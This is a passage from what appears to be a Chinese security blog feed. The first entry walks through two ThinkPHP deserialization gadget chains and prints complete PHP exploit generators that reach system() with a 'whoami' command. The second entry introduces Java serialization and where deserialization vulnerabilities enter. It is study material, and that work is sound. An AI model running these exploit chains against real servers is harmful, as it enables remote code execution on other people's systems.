src="https://ae01.alicdn.com/kf/Uece731b7f26a4d57bdcf284ab22b2924Y.jpg"></p><p>函数名为<code>$closure = $this-&gt;withAttr[$fieldName];</code>，<code>$fieldName</code>来源于经过<code>Loader::parseName</code>函数处理的<code>getAttr()</code>函数参数<code>$name</code>，而<code>getAttr()</code>函数参数等于<code>$data</code>的键名<code>$key</code>，<code>$data</code>由<code>$this-&gt;data</code>和<code>$this-&gt;merge</code>合并而成。最终等于<code>$this-&gt;withAttr[$key]</code>。让数组<code>$this-&gt;withAttr</code>与<code>$this-&gt;data</code>有相同的键名即可</p><p>执行命令：<br><code>$value=$this-&gt;getData($name)</code>,<code>$name</code>为<code>getAttr()</code>参数，在<code>getData()</code>函数中只要满足<code>array_key_exists($name, $this-&gt;data</code>)就会返回<code>$this-&gt;data[$name]</code>，<code>$name</code>为传入参数等于键值$key，最终等于<code>$this-&gt;data[$key]</code>。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>&#123;<br>    <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">Model</span>&#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">withAttr</span> = [];<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;withAttr=[<span class="hljs-string">&#x27;a&#x27;</span>=&gt;<span class="hljs-string">&#x27;system&#x27;</span>];<br>            <span class="hljs-keyword">$this</span>-&gt;data=[<span class="hljs-string">&#x27;a&#x27;</span>=&gt;<span class="hljs-string">&#x27;whoami&#x27;</span>];<br>        &#125;<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span>&#123;<br><br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span> &#123;<br>    <span class="hljs-title">use</span> \<span class="hljs-title">think</span>\<span class="hljs-title">Model</span>\<span class="hljs-title">Pivot</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Process</span>;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pipes</span></span><br><span class="hljs-class">    </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Pipes</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;files=[<span class="hljs-keyword">new</span> Pivot()];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-keyword">new</span> Windows()));<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/U60abe354ddfc4d3e8d3e92a008178e45f.jpg"></p><h1 id="利用链2"><a href="#利用链2" class="headerlink" title="利用链2"></a>利用链2</h1><p>前面的触发点都一样，区别在<code>toArray()</code>这里</p><p><code>toArray()</code></p><p>调用<code>_call()</code>方法，首先遍历数组<code>$this-&gt;append</code>，当键值<code>$name</code>为数组时满足<code>is_array($name)</code>。让<code>$relation</code>等于类名即可触发<code>_call()</code></p><p>在这之前按需要满足3个条件</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-number">1</span>.<span class="hljs-variable">$this</span>-&gt;append不为空<br><span class="hljs-number">2</span>.is_array(<span class="hljs-variable">$name</span>)<br>让<span class="hljs-variable">$this</span>-&gt;append等于二维数组，<span class="hljs-variable">$this</span>-&gt;append=[<span class="hljs-variable">$key</span>-&gt;数组]<br><span class="hljs-number">3</span>.!<span class="hljs-variable">$relation</span><br>构造<span class="hljs-variable">$this</span>-&gt;append[<span class="hljs-string">&#x27;aaa&#x27;</span>]和 <span class="hljs-variable">$this</span>-&gt;relation=[<span class="hljs-string">&#x27;mmm&#x27;</span>=&gt;<span class="hljs-string">&#x27;&#x27;</span>];即可<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/U459391197d914340af21fc63a2aa0558i.jpg"></p><p><code>getRelation()</code></p><p>满足<code>array_key_exists($name, $this-&gt;relation)</code>就会返回<code>$this-&gt;relation[$name]</code>。<code>$name</code>就是<code>$this-&gt;append</code>数组中的键名。需要让<code>$this-&gt;relation[$name]</code>等于空才能满足<code>!$relation</code>执行下面的语句。</p><p><img src="https://ae01.alicdn.com/kf/U031c17d448de4072ac1f1cb6d26c64a8e.jpg"></p><p><code>getAttr()</code>返回$value，也就是经过<code>getData()</code>处理的参数<code>$key</code></p><p><img src="https://ae01.alicdn.com/kf/U268db8f0b73d4aa996777ff2ce663d40V.jpg"></p><p><code>getData()</code>，<code>$name</code>就是<code>$this-&gt;append</code>数组中的键名<code>$key</code>，最终返回<code>$this-&gt;data[$name]</code>，让它等于一个存在<code>__call()</code>方法且不存在<code>visable()</code>方法的类即可调用<code>__call</code></p><p><img src="https://ae01.alicdn.com/kf/U7297b1d24af04ccab240da1344f9df3dC.jpg"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">thinkphp<span class="hljs-regexp">/library/</span>think/Request.php<br></code></pre></td></tr></table></figure><p><code>__call()</code>,由于<code>array_unshift()</code>会修改参数数组，造成执行命令不可控，所以没办法直接利用这个<code>call_user_func_array</code>,只能寻找新的利用点</p><p><img src="https://ae01.alicdn.com/kf/Ua63f68ce9d2748798f794fb759e8cdb9k.jpg"></p><p><code>filterValue()</code>函数中存在<code>call_user_func</code>，但是<code>$value</code>不可控，不能直接利用</p><p><img src="https://ae01.alicdn.com/kf/Ufdada4a625b04e4295940acc23fae4c8A.jpg"></p><p><code>input()</code>函数中调用了<code>filterValue()</code>，参数不可控不能直接利用</p><p><img src="https://ae01.alicdn.com/kf/U42a605b070ab4f9c918ffe6ce97d5ef4G.jpg"></p><p><code>param()</code>函数调用<code>input()</code>，执行<code>$this-&gt;input($this-&gt;param, $name, $default, $filter);</code>，参数仍不可控。</p><p><img src="https://ae01.alicdn.com/kf/U15cd63721be540628c8127f9ae2d8163D.jpg"></p><p><code>isAjax()</code>调用<code>param()</code>，参数<code>$this-&gt;config[&#39;var_ajax&#39;]</code>可控，这样<code>param()</code>函数中的<code>$name</code>参数可控，这样<code>input()</code>函数中的<code>$name</code>可控。<code>param()</code>函数可以接收<code>$_GET</code>数组赋值给<code>$this-&gt;param</code>，这样<code>input()</code>函数的前两个参数<code>$this-&gt;param</code>和<code>$name</code>都可控了</p><p><img src="https://ae01.alicdn.com/kf/Uadedd1ace0724bae913a1bc5ca99c814S.jpg"></p><p>回到<code>input()</code>函数，传入<code>filterValue()</code>函数的第一个参数<code>$data</code>和第三个<code>$filter</code>是执行命令的关键。$data等于<code>$this-&gt;getData($data,$name)</code>，两个函数参数就是<code>input()</code>传入的参数<code>$this-&gt;param</code>和<code>$name</code>。而<code>$filter</code>等于<code>$this-&gt;getFilter($filter, $default);</code></p><p><img src="https://ae01.alicdn.com/kf/U42a605b070ab4f9c918ffe6ce97d5ef4G.jpg"></p><p><code>getData()</code>,最终<code>$data</code> = <code>$data[$val]</code> = <code>$data[$name]</code>，也就是<code>$this-&gt;param[$this-&gt;config[&#39;var_ajax&#39;]]</code></p><p><img src="https://ae01.alicdn.com/kf/Uec06295fde6b4fa8978eb6e3f5847e39t.jpg"></p><p><code>getFilter()</code>，<code>$filter</code>来源于<code>$this-&gt;filter</code></p><p><img src="https://ae01.alicdn.com/kf/U2f4c13e776b44f79ba1ba227bc0063b3G.jpg"></p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Request</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">hook</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = [<br>            <span class="hljs-comment">// 表单请求类型伪装变量</span><br>            <span class="hljs-string">&#x27;var_method&#x27;</span>       =&gt; <span class="hljs-string">&#x27;_method&#x27;</span>,<br>            <span class="hljs-comment">// 表单ajax伪装变量</span><br>            <span class="hljs-string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="hljs-string">&#x27;_ajax&#x27;</span>,<br>            <span class="hljs-comment">// 表单pjax伪装变量</span><br>            <span class="hljs-string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="hljs-string">&#x27;_pjax&#x27;</span>,<br>            <span class="hljs-comment">// PATHINFO变量名 用于兼容模式</span><br>            <span class="hljs-string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="hljs-string">&#x27;s&#x27;</span>,<br>            <span class="hljs-comment">// 兼容PATH_INFO获取</span><br>            <span class="hljs-string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="hljs-string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="hljs-string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="hljs-string">&#x27;REDIRECT_URL&#x27;</span>],<br>            <span class="hljs-comment">// 默认全局过滤方法 用逗号分隔多个</span><br>            <span class="hljs-string">&#x27;default_filter&#x27;</span>   =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-comment">// 域名根，如thinkphp.cn</span><br>            <span class="hljs-string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-comment">// HTTPS代理标识</span><br>            <span class="hljs-string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-comment">// IP代理获取标识</span><br>            <span class="hljs-string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="hljs-string">&#x27;HTTP_X_REAL_IP&#x27;</span>,<br>            <span class="hljs-comment">// URL伪静态后缀</span><br>            <span class="hljs-string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="hljs-string">&#x27;html&#x27;</span>,<br>        ];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$param</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filter</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;hook=[<span class="hljs-string">&#x27;visible&#x27;</span>=&gt;[<span class="hljs-keyword">$this</span>,<span class="hljs-string">&#x27;isAjax&#x27;</span>]];<br>            <span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;var_ajax&#x27;</span>]=<span class="hljs-string">&#x27;payload&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;param=[<span class="hljs-string">&#x27;payload&#x27;</span>=&gt;<span class="hljs-string">&#x27;whoami&#x27;</span>];<br>            <span class="hljs-keyword">$this</span>-&gt;filter=[<span class="hljs-string">&#x27;system&#x27;</span>];<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$append</span> = [];<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$relation</span> = [];<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span> = [];<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;append=[<span class="hljs-string">&#x27;mmm&#x27;</span>=&gt;[]];<br>            <span class="hljs-keyword">$this</span>-&gt;data=[<span class="hljs-string">&#x27;mmm&#x27;</span>=&gt;<span class="hljs-keyword">new</span> Request()];<span class="hljs-comment">//等于new Request</span><br>            <span class="hljs-keyword">$this</span>-&gt;relation=[<span class="hljs-string">&#x27;mmm&#x27;</span>=&gt;<span class="hljs-string">&#x27;&#x27;</span>];<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>&#123;<br><br><span class="hljs-title">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span>&#123;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span>&#123;<br><br>    <span class="hljs-title">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Pivot</span>;<br>    <span class="hljs-comment">//use think\Process;</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span> = [];<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;files=[<span class="hljs-keyword">new</span> Pivot()];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-keyword">new</span> Windows()));<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/U4bbf06ed57dd48b48e13e1b84f31bffbz.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化学习</title>
    <link href="/2021/04/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/04/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="Serializeable"><a href="#Serializeable" class="headerlink" title="Serializeable"></a>Serializeable</h1><p>Seializeable是java实现序列化机制的工具，序列化数据包含对象类型和属性值。</p><p>Serializeable工具的简单说明</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj">只需要实现Serializeable接口就可以进行对象的序列化处理<br>序列化对象可以是基本数据类型、集合类或其他对象<br>使用<span class="hljs-keyword">transient</span>、<span class="hljs-keyword">static</span>关键字修饰的属性不会被序列化<br>父类不可序列化时，需要父类中存在无参构造函数。<br></code></pre></td></tr></table></figure><p>相关接口和类</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.io</span>.Serializable<br>java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.Externalizable</span>  <span class="hljs-comment">//该接口需要实现writeExternal和readExternal函数控制序列化</span><br>ObjectOutput<br>ObjectInput<br>ObjectOutputStream<br>ObjectInputStream<br></code></pre></td></tr></table></figure><p>序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//创建OutputStream对象</span><br>OutputStream outputStream= <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;serial&quot;</span>);<br><span class="hljs-comment">//将其封装到ObjectOutputStream对象中</span><br>ObjectOutputStream objectOutputStream=<span class="hljs-keyword">new</span> ObjectOutputStream((outputStream));<br><span class="hljs-comment">//此后调用writeObject()对客完成对象的序列化，并将其发送给OutputStream</span><br>objectOutputStream.writeObject(Object);<br><span class="hljs-comment">//关闭资源</span><br>objectOutputStream.close();<br>outputStream.close();<br></code></pre></td></tr></table></figure><p>反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//创建OutputStream对象</span><br>InputStream inputStream=<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;serial&quot;</span>);<br><span class="hljs-comment">//将其封装到ObjectInputStream对象中</span><br>ObjectInputStream objectInputStream=<span class="hljs-keyword">new</span> ObjectInputStream((inputStream));<br><span class="hljs-comment">//只需调用readObject(0即可完成对象的反序列化</span><br>objectInputStream.readObject();<br><span class="hljs-comment">//关闭资源</span><br>objectInputStream.close();<br>inputStream.close();<br></code></pre></td></tr></table></figure><h2 id="Serializable接口"><a href="#Serializable接口" class="headerlink" title="Serializable接口"></a>Serializable接口</h2><p>一般一个类只要继承了Serializable接口，就代表该类和其子类都能进行JDK的序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tq;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyJavaSerialize</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UInfo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span></span>&#123;<br>        <span class="hljs-keyword">private</span> String userName;<br>        <span class="hljs-keyword">private</span>  <span class="hljs-keyword">int</span> userAge;<br>        <span class="hljs-keyword">private</span>  String userAddress;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUserName</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> userName;&#125;;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getUserAge</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> userAge;&#125;;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUserAddress</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> userAddress;&#125;;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUserName</span><span class="hljs-params">(String userName)</span></span>&#123;<span class="hljs-keyword">this</span>.userName=userName;&#125;;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUserAge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> userAge)</span></span>&#123;<span class="hljs-keyword">this</span>.userAge=userAge;&#125;;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUserAddress</span><span class="hljs-params">(String userAddress)</span></span>&#123;<span class="hljs-keyword">this</span>.userAddress=userAddress;&#125;;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        UInfo userInfo=<span class="hljs-keyword">new</span> UInfo();<br>        userInfo.setUserAddress(<span class="hljs-string">&quot;a&quot;</span>);<br>        userInfo.setUserAge(<span class="hljs-number">22</span>);<br>        userInfo.setUserName(<span class="hljs-string">&quot;admin&quot;</span>);<br><br>        OutputStream outputStream=<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;serial&quot;</span>);<br>        ObjectOutputStream objectOutputStream=<span class="hljs-keyword">new</span> ObjectOutputStream(outputStream);<br>        objectOutputStream.writeObject(userInfo);<br>        objectOutputStream.close();<br>        outputStream.close();<br><br>        InputStream inputStream=<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;serial&quot;</span>);<br>        ObjectInputStream objectInputStream=<span class="hljs-keyword">new</span> ObjectInputStream(inputStream);<br>        UInfo unserialUInfo=(UInfo) objectInputStream.readObject();<br>        objectInputStream.close();<br>        inputStream.close();<br><br>        System.out.println(unserialUInfo.userName);<br>        System.out.println(unserialUInfo.userAge);<br>        System.out.println(unserialUInfo.userAddress);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果，工程目录下会生成一个serial文件，其内容就是序列化后的数据</p><p><img src="https://www.hualigs.cn/image/6073d5c5e3da5.jpg"></p><h2 id="Externalizable接口"><a href="#Externalizable接口" class="headerlink" title="Externalizable接口"></a>Externalizable接口</h2><p>除了Serializable接口，java还提供了另一个序列化接口Externalizable，该接口继承自Serializable接口，但是有两个抽象函数：writeExternal和readExternal。需要自行实现两个函数来控制序列化流程，否则目标序列化类属性值会是类初始化后的默认值。</p><p>在使用Externalizable接口实现序列化时，读取对象会调用目标序列化类的无参构造函数去创建一个新的对象，再把徐磊话数据中的类属性值分别填充到新对象中。所以实现Externalizable接口的类必须提供一个public属性的无参构造函数</p><h2 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="serialVersionUID"></a>serialVersionUID</h2><p>目标序列化类有一个隐藏属性</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVerionUID<br></code></pre></td></tr></table></figure><p>Java虚拟机判断是否允许序列化数据被序列化时，会取决于两个类的serialVersionUID是否一致。serialVerionUID在不同编译器内可能有不同的值，开发者可以在目标序列化类中提供固定值。在提高serialVerionUID固定值的情况下，只要序列化数据中国的serialVerionUID和目标序列化类中的一致就可以成功反序列化。如果没有指定值，编译器会根据class文件内容通过一定算法生成值，在不同环境下，编译器得到的serialVerionUID值不同，就会导致反序列化失败。改变目标类中代码也可能会影响生成的serialVersionUID，此时会抛出java.io.InvalidClassException并指出serialVersionUID不一致。建议在目标序列化类中显示定义serialVersionUID并赋予明确的值。</p><p>显示定义serialVersionUID有两种用途：</p><p>1.在某些场合，希望类的不同版本兼容序列化，所以需要确保类的不同版本有相同的serialVersionUID</p><p>2.某些时候不希望类的不同版本对序列化有兼容，所以需要类的不同版本有不同的serialVerionUID</p><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>java有多种序列化和反序列化工具</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">JDK自带的<span class="hljs-keyword">Serializable</span><br>fastjson和jackson是<span class="hljs-type">JSON</span>的知名反序列化工具<br>xmldecoder和xstream是<span class="hljs-type">XML</span>的知名反序列化工具<br></code></pre></td></tr></table></figure><p>java拥有完善的第三方类库和满足各种需求的框架，但因为很多第三方类库引用广泛，如果其中某些组件出现安全问题，那么受影响范围将极为广泛。</p><h2 id="漏洞入口"><a href="#漏洞入口" class="headerlink" title="漏洞入口"></a>漏洞入口</h2><p>ObjectInputStream对象的readObject函数调用是java反序列化流程的入口，序列化数据的来源包括：Cookie、GET参数、POST参数或者流、HTTP Head或者来自用户可控内容的数据库等。</p><p>触发场景：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">1<span class="hljs-selector-class">.HTTP</span>请求中的参数<br>2<span class="hljs-selector-class">.RMI</span>，即<span class="hljs-selector-tag">Java</span>远程方法调用，在<span class="hljs-selector-tag">RMI</span>中传输的数据皆为序列化<br>3<span class="hljs-selector-class">.JMX</span>，一个为应用程序植入管理功能的框架<br>4.自定义协议 用来接收与发送原始的<span class="hljs-selector-tag">java</span>对象<br></code></pre></td></tr></table></figure><p>反序列化相关函数</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span 